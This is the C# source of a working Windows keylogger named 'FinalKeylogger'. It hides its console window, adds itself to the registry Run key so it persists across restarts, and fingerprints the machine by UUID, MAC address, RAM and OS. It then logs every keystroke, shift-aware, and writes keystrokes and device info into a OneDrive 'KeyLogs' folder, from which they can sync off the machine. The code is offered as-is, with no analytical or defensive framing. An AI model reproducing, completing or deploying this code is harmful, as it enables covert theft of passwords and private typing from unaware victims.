using System;
using System.IO;
using System.Text;
using System.Management;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using System.Threading;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

class Program
{
    [DllImport("User32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    static StringBuilder logBuffer = new StringBuilder();
    static string keyLogFilePath;
    static DateTime lastFlushTime = DateTime.Now;
    static string typedBuffer = "";

    static void Main()
    {
        // Hide console window
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // Add to startup
        AddToStartup();

        // Collect system info
        string uuid = GetUUID();
        string mac = GetMacAddress();
        string ram = GetRAMSize();
        string os = Environment.OSVersion.ToString();
        string desktopName = Environment.MachineName;

        // Prepare folder path
        string oneDrivePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive");
        string folderPath = Path.Combine(oneDrivePath, "KeyLogs", uuid);
        Directory.CreateDirectory(folderPath);

        // Write device info to separate file
        string deviceInfoPath = Path.Combine(folderPath, "deviceinfo.txt");
        if (!File.Exists(deviceInfoPath))
        {
            StringBuilder deviceInfo = new StringBuilder();
            deviceInfo.AppendLine($"{uuid}");
            deviceInfo.AppendLine($"{mac}");
            deviceInfo.AppendLine($"{ram} MB");
            deviceInfo.AppendLine($"{os}");
            deviceInfo.AppendLine($"{desktopName}");
           

            File.WriteAllText(deviceInfoPath, deviceInfo.ToString());
        }

        // Set keylog file path
        keyLogFilePath = Path.Combine(folderPath, "keylogs.txt");
        if (!File.Exists(keyLogFilePath))
        {
          
        }

        // Keylogging loop
        while (true)
        {
            for (int i = 8; i <= 255; i++)
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    string key = ConvertKeyCode(i);

                    if (!string.IsNullOrEmpty(key))
                    {
                        if (key == "[Backspace]")
                        {
                            if (typedBuffer.Length > 0)
                                typedBuffer = typedBuffer.Substring(0, typedBuffer.Length - 1);
                            if (logBuffer.Length > 0)
                                logBuffer.Remove(logBuffer.Length - 1, 1);
                        }
                        else
                        {
                            logBuffer.Append(key);
                            typedBuffer += key;
                        }

                        if (typedBuffer.EndsWith("xyz"))
                        {
                            FlushBufferToFile();
                            return;
                        }
                    }

                    if ((DateTime.Now - lastFlushTime).TotalSeconds > 5 || logBuffer.Length > 100)
                    {
                        FlushBufferToFile();
                    }
                }
            }
            Thread.Sleep(5);
        }
    }

    static void FlushBufferToFile()
    {
        if (logBuffer.Length > 0)
        {
            File.AppendAllText(keyLogFilePath, logBuffer.ToString());
            logBuffer.Clear();
            lastFlushTime = DateTime.Now;
        }
    }

    static bool shiftPressed = false;

    static string ConvertKeyCode(int keyCode)
    {
        shiftPressed = (GetAsyncKeyState(0x10) & 0x8000) != 0; // Shift key

        if (keyCode >= 65 && keyCode <= 90)
        {
            char c = (char)keyCode;
            return shiftPressed ? c.ToString() : c.ToString().ToLower();
        }

        if (keyCode >= 48 && keyCode <= 57)
        {
            if (shiftPressed)
            {
                switch (keyCode)
                {
                    case 48: return ")";
                    case 49: return "!";
                    case 50: return "@";
                    case 51: return "#";
                    case 52: return "$";
                    case 53: return "%";
                    case 54: return "^";
                    case 55: return "&";
                    case 56: return "*";
                    case 57: return "(";
                }
            }
            else
            {
                return ((char)keyCode).ToString();
            }
        }

        switch (keyCode)
        {
            case 32: return " ";
            case 13: return "\n";
            case 8: return "[Backspace]";
            case 190: return shiftPressed ? ">" : ".";
            case 188: return shiftPressed ? "<" : ",";
            case 191: return shiftPressed ? "?" : "/";
            case 186: return shiftPressed ? ":" : ";";
            case 222: return shiftPressed ? "\"" : "'";
            case 189: return shiftPressed ? "_" : "-";
            case 187: return shiftPressed ? "+" : "=";
            case 220: return shiftPressed ? "|" : "\\";
            case 219: return shiftPressed ? "{" : "[";
            case 221: return shiftPressed ? "}" : "]";
            case 192: return shiftPressed ? "~" : "`";
        }

        return "";
    }

    static string GetUUID()
    {
        try
        {
            using (var mc = new ManagementClass("Win32_ComputerSystemProduct"))
            {
                foreach (var o in mc.GetInstances())
                {
                    return o.Properties["UUID"].Value.ToString();
                }
            }
        }
        catch { }
        return "UnknownUUID";
    }

    static string GetMacAddress()
    {
        try
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up &&
                    nic.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                    !nic.Description.ToLower().Contains("virtual") &&
                    !nic.Description.ToLower().Contains("pseudo"))
                {
                    string mac = nic.GetPhysicalAddress().ToString();
                    if (!string.IsNullOrEmpty(mac))
                        return mac;
                }
            }
        }
        catch { }
        return "UnknownMAC";
    }

    static string GetRAMSize()
    {
        try
        {
            ComputerInfo info = new ComputerInfo();
            return (info.TotalPhysicalMemory / (1024 * 1024)).ToString();
        }
        catch
        {
            return "UnknownRAM";
        }
    }

    static void AddToStartup()
    {
        try
        {
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appName = "FinalKeylogger";

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
            {
                if (key.GetValue(appName) == null)
                {
                    key.SetValue(appName, exePath);
                }
            }
        }
        catch (Exception ex)
        {
            File.AppendAllText("error.log", "Startup error: " + ex.Message + Environment.NewLine);
        }
    }
}
